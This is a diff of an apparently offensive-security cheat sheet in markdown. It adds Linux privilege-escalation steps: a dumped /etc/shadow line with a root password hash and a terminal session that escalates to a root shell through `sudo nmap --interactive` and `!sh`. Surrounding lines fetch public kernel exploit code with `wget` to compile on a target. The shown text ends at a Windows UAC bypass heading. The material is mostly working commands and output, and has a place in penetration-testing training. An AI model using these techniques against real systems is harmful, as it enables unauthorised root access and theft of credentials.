@@ -635,7 +635,29 @@ wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-403
 wget https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/memodipper/memodipper.c
 gcc memodipper.c -o memodipper #compile on the target not kali
 ````
+### Bad File permissions
+#### cat /etc/shadow
+````
+root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7:::                                                                                                              vcsa:!!:15422:0:99999:7:::
+pcap:!!:15422:0:99999:7:::
+````
+### sudo -l
+#### (root) NOPASSWD: /usr/bin/nmap
+````
+bash-3.2$ id     
+id
+uid=100(asterisk) gid=101(asterisk)
+bash-3.2$ sudo nmap --interactive
+sudo nmap --interactive
 
+Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+sh-3.2# id
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+````
 ## Windows PrivEsc <img src="https://vangogh.teespring.com/v3/image/9YwsrdxKpMa_uTATdBk8_wFGxmE/1200/1200.jpg" width="40" height="40" />
 ### User Account Control (UAC) Bypass
 UAC can be bypassed in various ways. In this first example, we will demonstrate a technique that
